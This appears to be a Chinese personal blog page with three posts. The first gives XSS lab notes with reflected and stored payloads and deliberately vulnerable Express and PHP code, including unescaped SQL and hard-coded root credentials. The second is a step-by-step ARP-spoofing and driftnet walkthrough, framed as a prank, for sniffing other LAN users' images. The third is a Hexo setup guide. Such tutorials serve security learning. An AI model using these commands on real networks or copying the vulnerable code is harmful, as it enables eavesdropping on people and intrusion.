<p><strong>(题外话：使用express搭建简易的服务器)</strong></p>
<p>本机已有node.js的前提下，安装express<br>    <code>sudo npm install -g express</code><br>    <code>sudo npm install -g express-generator</code></p>
<p>创建一个目录xss,使用express创建一个简易的web应用框架<br>    <code>express -e ./</code>(-e 表示使用ejs框架)<br><img src="/2019/01/25/学习记录-关于XSS/1.png" alt="1"><br>然后npm install，安装所有依赖，最后在xss目录下 npm start，就可以开启这个web框架，访问https:localhost:3000就可以访问了<br>然后修改一下xss文件中的router-&gt;index.js文件，修改后如下：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">/* GET home page. */</span><br><span class="line">router.get(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line">res.set(&apos;X-XSS-Protection&apos;,0);</span><br><span class="line">res.render(&apos;index&apos;, &#123; title: &apos;Express&apos;,xss:req.query.xss&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure></p>
<p>修改views-&gt;index.js文件，修改后如下：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt;</span><br><span class="line">    &lt;div class=&quot;&quot;&gt;</span><br><span class="line">    	&lt;%- xss %&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这两步就是为了添加一个XSS的接口，使得我们可以输入一个名为$xss的变量，仅为实验环境，弱智了一点。<br><img src="/2019/01/25/学习记录-关于XSS/2.png" alt="1"></p>
<p>那么在这里我先抛砖引玉地挂上一个栗子，初步理解一下XSS的整个攻击流程，</p>
<p>查看未攻击时的源代码<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Express&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Express&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Welcome to Express&lt;/p&gt;</span><br><span class="line">    &lt;div class=&quot;&quot;&gt;</span><br><span class="line">    	</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>现在进行反射型xss攻击，我们的payload如下：<br>    <code>http://localhost:3000/?xss=&lt;img src=&quot;null&quot; onerror=&quot;alert(1)&quot;/&gt;</code></p>
<p>这时候再观察页面还有源码<br><img src="/2019/01/25/学习记录-关于XSS/3.png" alt="3"><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Express&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Express&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Welcome to Express&lt;/p&gt;</span><br><span class="line">    &lt;div class=&quot;&quot;&gt;</span><br><span class="line">    	&lt;img src=&quot;null&quot; onerror=&quot;alert(1)&quot;/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>有没有发现有什么不一样，我们输入的东西被解析成script语句，又被浏览器解析，所以一次很简单的反射型xss攻击就由此完成了。<br>然后好玩的东西来了，我们再把payload改成其他的东西<br>    <code>http://localhost:3000/?xss=&lt;p onclick=&quot;alert(&#39;you a foolish dog&#39;)&quot;&gt;你点我啊&lt;/p&gt;</code><br>查看效果以及源码<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Express&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Express&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Welcome to Express&lt;/p&gt;</span><br><span class="line">    &lt;div class=&quot;&quot;&gt;</span><br><span class="line">    	&lt;p onclick=&quot;alert(&apos;you a foolish dog&apos;)&quot;&gt;你点我啊&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/01/25/学习记录-关于XSS/4.png" alt="4"></p>
<hr>
<p>(2)存储型XSS:<br>存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。</p>
<p>最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。</p>
<p>现在我在通过一个小栗子来理解一下存储型XSS,先写一段小代码xss.php（这里要在mysql中配好相应的数据库和数据表以及其中的columns），<br>先看看这段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">     &lt;input type=&quot;text&quot; name=&quot;xss&quot;/&gt;  </span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;  </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss=@$_POST[&apos;xss&apos;];  </span><br><span class="line">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);  </span><br><span class="line">mysql_select_db(&quot;xss&quot;);  </span><br><span class="line">if($xss!==null)&#123;  </span><br><span class="line">    $sql=&quot;insert into temp(id,payload) values(&apos;14&apos;,&apos;$xss&apos;)&quot;;  </span><br><span class="line">    $result=mysql_query($sql);  </span><br><span class="line">    echo $result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>看完应该能懂我在做什么，那个数字自己可以改的，本来是想着，连id都做成自己输入的，但是代码不会写，只能这样将就了，有点low.<br>然后再写一段代码show.php，用于返回，插入数据库的信息.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);  </span><br><span class="line">mysql_select_db(&quot;xss&quot;);  </span><br><span class="line">$sql=&quot;select payload from temp where id=14&quot;;  </span><br><span class="line">$result=mysql_query($sql);  </span><br><span class="line">while($row=mysql_fetch_array($result))&#123;  </span><br><span class="line">   echo $row[&apos;payload&apos;];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/01/25/学习记录-关于XSS/5.png" alt="5"><br>文本框中输入：<script>alert(\’you foolish\’)</script>,点击text<br>然后再看show.php,就会发现这种情况<br><img src="/2019/01/25/学习记录-关于XSS/6.png" alt="6"><br>然后我们再查找数据库<br><img src="/2019/01/25/学习记录-关于XSS/7.png" alt="7"></p>
<h2 id="说明我们成功地完成了一次存储型XSS攻击"><a href="#说明我们成功地完成了一次存储型XSS攻击" class="headerlink" title="说明我们成功地完成了一次存储型XSS攻击"></a>说明我们成功地完成了一次存储型XSS攻击</h2>
          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/小游戏-通过arp欺骗嗅探图片/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/23/小游戏-通过arp欺骗嗅探图片/" class="post-title-link" itemprop="url">小游戏--通过arp欺骗嗅探图片</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-01-23 15:54:43" itemprop="dateCreated datePublished" datetime="2019-01-23T15:54:43+08:00">2019-01-23</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-03-01 17:00:09" itemprop="dateModified" datetime="2019-03-01T17:00:09+08:00">2019-03-01</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>参考：<a href="https://www.freebuf.com/articles/web/160511.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/160511.html</a><br>一个简单的小游戏，恶作剧一下。<br>通过arp欺骗嗅探的内网其他用户的图片浏览情况，大致的过程：<br>（1）开启Linux的root权限，不开启的话，被攻击的对象会断网<br>（2）开启路由转发功能<br>（3）扫描内网中机器<br>（4）通过arp欺骗，截取攻击目标的信息<br>（5）通过driftnet来嗅探</p>
<p>接下来将会一步一步地进行演示：<br><strong>0x01</strong><br>开启root权限大家都会吧<br>开启路由转发功能，linux开启路由转发功能有两种，一种是临时开启，一种是永久开启。<br>临时开启：（一次性的，重启时，需要重新设置）<br>    <code>echo &quot;1&quot;&gt;/proc/sys/net/ipv4/ip_forward</code>（将文件/proc/sys/net/ipv4/ip_forward值改为1）<br>永久开启：<br>    <code>sysctl -p</code>（将文件/etc/sysctl.conf里面的net.ipv4.ip_forward=1的注释去除）</p>
<p><strong>0x02</strong><br>扫描内网中存在的主机，扫描工具这里，我们用的是nmap<br>下载nmap:<br>     <code>apt-get install nmap</code><br>运行nmap:<br>     <code>nmap -sP 192.168.1.0/24</code>(扫描192.168.1/24网段下的所有主机的IP)<br>     <code>cat /proc/net/arp</code>（查看arp缓存，选择一个主机，进行arp欺骗）<br><strong>注意：这里有个小问题就是，手机的IP地址不知道为什么没有出现在arp缓存表中，我们多扫几遍，在终端中查看</strong><br><img src="/2019/01/23/小游戏-通过arp欺骗嗅探图片/1.png" alt="arp"></p>
<p><strong>0x03</strong><br>进行arp欺骗，这里我们需要打开两个终端，使用到的工具是arpspoof，然而这个是kali才自带的，像ubuntu或者debian得安装dsniff才行<br>    <code>apt-get install dsniff</code></p>
<p>（192.168.1.11是我的手机的IP地址）<br>进行arp欺骗，首先打开第一个终端，我们敲这样的命令：<br>    <code>arpspoof -i wlp2s0 -t 192.168.1.11 192.168.1.1</code><br>这段命令的意思是让192.168.1.11的数据由经我们的主机再发送的路由器</p>
<p>再开一个终端，我们敲这样的命令：<br>    <code>arpspoof -i wlp2s0 -t 192.168.1.1 192.168.1.11</code><br>道理是一样的。这样我们的主机了欺骗的作用<br><strong>注意，这里“-i”这个参数应该后面接的是本机的网卡名，使用ifconfig查询自己电脑的网卡名，我的网卡名是wlp2s0</strong><br><img src="/2019/01/23/小游戏-通过arp欺骗嗅探图片/2.png" alt="网卡问题"></p>
<p><strong>0x04</strong><br>开启第三个终端，运行driftnet<br>这时你会发现不可以，因为我们没有指定参数，正确的命令是：<br>    ‘driftnet -i wlp2s0’<br>然后打开手机，随便浏览网页时，就会有这样的情况，(浏览微博的时候，微信发图片什么的都能嗅探到)<br><img src="/2019/01/23/小游戏-通过arp欺骗嗅探图片/3.png" alt="嗅探图片"></p>
<p>这里我就放这么一个小例子，通过arp欺骗，可以完成很多东西，俗称内网无敌，哈哈哈哈</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/22/build-my-blog/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/22/build-my-blog/" class="post-title-link" itemprop="url">build my blog</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-01-22 13:33:21" itemprop="dateCreated datePublished" datetime="2019-01-22T13:33:21+08:00">2019-01-22</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-02-01 09:43:26" itemprop="dateModified" datetime="2019-02-01T09:43:26+08:00">2019-02-01</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>  搭建博客使用hexo+github，这里我会将我搭这个博客的过程写出来，不是什么新奇的东西，但是在linux中搭博客不同与windows的是，全程使用命令行，好玩的同时，也学会了linux的基本语法。<br>    Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页,而github用于创建一个远程库，我们可以将本地的博客文件上传至github库中，这样子在这里就会使用到SSH协议，生成SSH公钥和密钥，用于保证本地和远程库的连接。</p>
<p><strong>0x01</strong><br> 准备工作：<br> 安装node.js的命令如下：<br>     <code>apt-get install gcc g++ make -y</code><br>     <code>wget https://nodejs.org/dist/v8.1.2/node-v8.1.2.tar.gz</code><br>     <code>tar zxf node-v8.1.2.tar.gz &amp;&amp; cd node-v8.1.2</code><br>     <code>./configure &amp;&amp; make &amp;&amp; make install</code></p>
<p> 安装git的命令如下：<br>     <code>apt-get install git</code>    </p>
<p> 安装npm的命令如下：<br>     <code>apt-get install npm</code></p>
<p><strong>0x02</strong><br> 这里，我们需要创建一个github的账号，并且新建一个repository,如下图所示：<br> <img src="/2019/01/22/build-my-blog/1.png" alt="1"><br> <img src="/2019/01/22/build-my-blog/2.png" alt="2"><br> 创建一个新的repository.(<strong>注意：repository的名称一定要是你的用户名，比如你的名称是min,那么库名就要是min.github.io</strong>)</p>
<p> 接着获取SSH KEY,命令如下：<br>    ‘’’<br>      mkdir ~/.ssh<br>      cd ~/.ssh<br>      ssh-keygen -t rsa<br>    ‘’’<br> 自己用的电脑，不用设置密码啥的，一路回车就行，这时候会在 ~/.ssh/下生成两个ssh key<br> 使用刚才生成那个公钥作为本机ssh使用的口令:<br>    ‘ssh-add ~/.ssh/id_rsa.pub’<br> 获取本机的公钥：<br>    ‘cat ~/.ssh/id_rsa.pub’<br> 进入github，在setting页面中，将公钥复制到Deploy Keys页面中<br> <img src="/2019/01/22/build-my-blog/3.png" alt="3"><br> <img src="/2019/01/22/build-my-blog/4.png" alt="4"><br> <img src="/2019/01/22/build-my-blog/5.png" alt="5"><br> 接着配置git<br>    ‘’’<br>    git config –global user.name “xxx”<br>    git config –global user.email “<a href="mailto:xxx@xxx.com" target="_blank" rel="noopener">xxx@xxx.com</a>”<br>    ‘’’<br> 最后测试一下：<br>    ‘ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>‘</p>
<p><strong>0x03</strong><br> 搭建本地hexo<br> 选择一个位置放hexo文件夹<br>    ‘’’<br>    npm install hexo-cli -g (安装hexo-cli)<br>    hexo init blog（安装hexo）<br>    cd blog (进入hexo)<br>    npm install (安装依赖)<br>    npm install hexo-deployer-git –save(用于将文件部署到github上)<br>    ‘’’<br>  进入blog文件夹，找到_config.yml，修改配置如下：<br>    ‘’’<br>      deploy:<br>        type: git<br>        repo: 你的库地址<br>        branch: master<br>    ‘’’<br>  <strong>注意：“：”后面有一个空格，否则会出大事</strong><br>    <code>hexo g</code><br>  把你写的文件部署到hexo上</p>
<pre><code>`hexo s`
</code></pre><p>  本地查看hexo博客，登录<a href="https://localhost：4000查看" target="_blank" rel="noopener">https://localhost：4000查看</a><br>  <img src="/2019/01/22/build-my-blog/bulid-my-blog/6.png" alt="6"></p>
<pre><code>`hexo clean`
</code></pre><p>  清除缓存</p>
<pre><code>&apos;hexo d&apos;
</code></pre><p>  将markdown文件部署到github上</p>
<p> <strong>0x04</strong><br>修改hexo主题的步骤：<br> github上找到自己想要的主题的源码–&gt;解压到hexo的themes文件–&gt;修改_config.yml文件中的theme位置的参数，改为主题的文件名<br> 最后重新部署就好了。</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
  
  <p class="site-author-name" itemprop="name">cookie</p>
  <div class="site-description motion-element" itemprop="description"></div>
</div>


  <nav class="site-state motion-element">
    
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">68</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    

    

    
  </nav>













          
          
        </div>
      </div>

      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cookie</span>

  

  
</div>


  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>










  
  













  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.2.0"></script>



  

  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  

  

  



  




  

  

  

  

  

  

  

  

  

  

  

  

  


  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
